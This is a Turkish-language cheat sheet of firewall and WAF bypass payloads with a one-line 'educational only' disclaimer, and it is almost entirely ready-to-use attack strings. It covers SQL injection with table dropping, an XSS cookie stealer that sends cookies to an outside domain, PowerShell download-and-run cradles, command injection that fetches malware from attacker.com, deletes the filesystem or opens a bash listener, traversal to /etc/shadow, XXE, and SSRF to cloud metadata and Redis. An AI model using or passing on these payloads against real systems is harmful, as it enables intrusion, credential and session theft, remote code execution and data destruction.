# Güvenlik Duvarı Atlatma Teknikleri

Aşağıda, çeşitli güvenlik duvarı atlatma tekniklerine dair geniş kapsamlı bir liste bulunmaktadır. Bu bilgiler yalnızca eğitim amaçlıdır ve yalnızca etik siber güvenlik uygulamalarında kullanılmalıdır.

## 1. SQL Enjeksiyonu Evasion Teknikleri

| Payload |
|---------|
| - ' OR 'a'='a |
| - ')) OR 'x'='x |
| - ' OR 1=1# |
| - ' OR 'x'='x |
| - -1 UNION SELECT 1,@@version -- + |
| - -1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1 -- + |
| - ' OR uname LIKE '%root% |
| - ' OR 'unusual' = 'unusual' |
| - ' OR 1=1 LIMIT 1 -- + comment |
| - '; DROP TABLE members; -- |
| - '; SELECT * FROM members WHERE username = 'admin' -- |

## 2. HTTP Parametre Kirliliği (HPP) WAF Atlatma

| Payload |
|---------|
| - url&s1="><script>document.location='http://yourdomain.com/cookie_stealer.php?c='+document.cookie</script> |
| - url&s1="><iframe src="http://evil.com" width="0" height="0" /> |
| - url&s1="><img src=x onerror=alert(1)> |
| - url&s1="><svg/onload=alert(1)> |
| - url&s1="><div style="background-image:url(javascript:alert('XSS'))"> |
| - url&s1="><a href="javascript:alert('XSS')">link</a> |

## 3. IP Atlatma

| Payload |
|---------|
| - X-Real-IP: istenen ip adresi |
| - X-Client-IP: istenen ip adresi |
| - Client-IP: istenen ip adresi |
| - X-Cluster-Client-IP: istenen ip adresi |
| - True-Client-IP: istenen ip adresi |
| - X-Forwarded-Host: istenen ip adresi |

## 4. Windows PowerShell Atlatma

| Payload |
|---------|
| - powershell.exe -ExecutionPolicy Bypass -File script.ps1 |
| - powershell -ep bypass -Command "& {Get-ExecutionPolicy}" |
| - powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://url/script.ps1')" |
| - powershell.exe -WindowStyle hidden {your script here} |
| - powershell -c "(New-Object Net.WebClient).DownloadFile('http://url/malware.exe', 'C:\Windows\Temp\malware.exe')" |

## 5. XSS (Cross Site Scripting) Atlatma

| Payload |
|---------|
| - <img src="x" onerror="alert('XSS')"> |
| - <svg/onload=alert('XSS')> |
| - "><script>alert('XSS')</script> |
| - <div style="width:100px;height:100px;background:url(javascript:alert('XSS'))"> |
| - <input type="text" name="name" value="<img src='x'onerror=alert('XSS')>"> |

## 6. CSRF (Cross Site Request Forgery) Atlatma

| Payload |
|---------|
| - <img src="http://target-site.com/csrf-endpoint?payload=value" width="0" height="0" /> |
| - <iframe src="http://target-site.com/csrf-endpoint?payload=value" width="0" height="0" /> |
| - <form action="http://target-site.com/csrf-endpoint" method="POST"><input type="hidden" name="payload" value="value" /></form><script>document.forms[0].submit()</script> |

## 7. Command Injection Atlatma

| Payload |
|---------|
| - ; ls |
| - ; cat /etc/passwd |
| - ; rm -rf / |
| - ; wget http://attacker.com/malware.exe |
| - ; nc -lvnp 4444 -e /bin/bash |

## 8. Directory Traversal Atlatma

| Payload |
|---------|
| - ../../etc/passwd |
| - ../../etc/shadow |
| - ../..//etc/passwd |
| - ..//..//etc//passwd |
| - ..//..//var//www//html//index.php |

## 9. XML External Entity (XXE) Atlatma

| Payload |
|---------|
| - <?xml version="1.0" ?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root> |
| - <?xml version="1.0" ?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://attacker.com/ssrf'>]><root>&test;</root> |

## 10. Server Side Request Forgery (SSRF) Atlatma

| Payload |
|---------|
| - http://localhost:8080/admin |
| - http://169.254.169.254/latest/meta-data/ |
| - http://[::]:80/ |
| - gopher://localhost:6379/_FLUSHALL |
